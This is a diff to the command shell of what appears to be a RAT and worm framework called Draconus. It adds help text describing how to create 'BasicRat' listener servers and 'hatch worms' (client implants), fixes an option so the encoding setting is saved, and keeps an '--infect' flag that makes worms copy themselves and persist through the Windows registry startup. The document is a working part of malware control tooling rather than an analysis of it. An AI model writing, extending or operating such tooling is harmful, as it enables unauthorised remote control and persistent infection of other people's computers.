@@ -33,6 +33,7 @@ class ShellConstructor:
             print("****** show          - Show servers list, types, files etc. 'show --help'")
             print("****** make          - Creates new server. see: 'make --help' for instruction")
             print("****** kill <name>   - Delete server. Ex: 'kill MyServer' ")
+            print("****** post          - Tool for load, save server config. see: 'post --help'")
             print("****** start         - Start listening on all servers. ")
             print("****** stop          - Stop listening on all servers")
             print("****** hive          - Creates worms (clients for specific server)'hive --help'")
@@ -53,6 +54,12 @@ class ShellConstructor:
         @click.option("--no_important", "-noi", is_flag=True, required=False, help="Dont show some no important messages. Less flood on screen")
         @click.option("--encode", "-e", required=False, help="Set format encoding")
         def make(name, types, port, ip, raw_len, http, no_important, encode) -> None:
+            """\n*********** MAKE Function ***********\n
+Creates a new server ready to operate. You need to provide its name, select the type, and specify the port (recommended: 1000 - 9999).\n
+Each server operates as a separate process as long as Draconus is running.\n
+To have the created server start accepting connections, you must switch it to "listening" mode.\n
+ex: make my_server BasicRat 2233        - make BasicRat server on port 2233
+ex: make echos Echo 3333 -e utf-8       - make Echo server on port 3333 with encode utf-8"""
             conf = {"NAME": name, "PORT" : port, "SERV_TYPE" : types}
             if ip:
                 conf["IP"] = ip
@@ -63,7 +70,7 @@ class ShellConstructor:
             if no_important:
                 conf["MSG_NO_IMPORTANT"] = True
             if encode:
-                conf["FORMAT_CODE"]
+                conf["FORMAT_CODE"] = encode
             self.CoCe.sendCMD("make", conf)
             sleep(1)
             self.CoCe.findSockets()
@@ -101,7 +108,10 @@ class ShellConstructor:
         @click.option("--infect", "-i", is_flag=True, required=False, help="Add cloning function to worms. Copy self and add to registry startup. WORKING ONLY ON WINDOWS !!!")
         def hive(name, infect) -> None:
             """ **** Welcome To Hive *******\n
-            """
+Hatchering new worm working with specific server.\n
+Basic clients 'Worms' operate on Linux and Windows. Primarily, the clients are designed for the Windows system and will not work on other systems.\n
+ex: hive my_serv1\n
+Every hatched worm will be placed in HIVE directory"""
             conf = self.CoCe.sendApi(name, "conf", response=True)
             if not conf:
                 print("[CC] ERROR: not recived config")
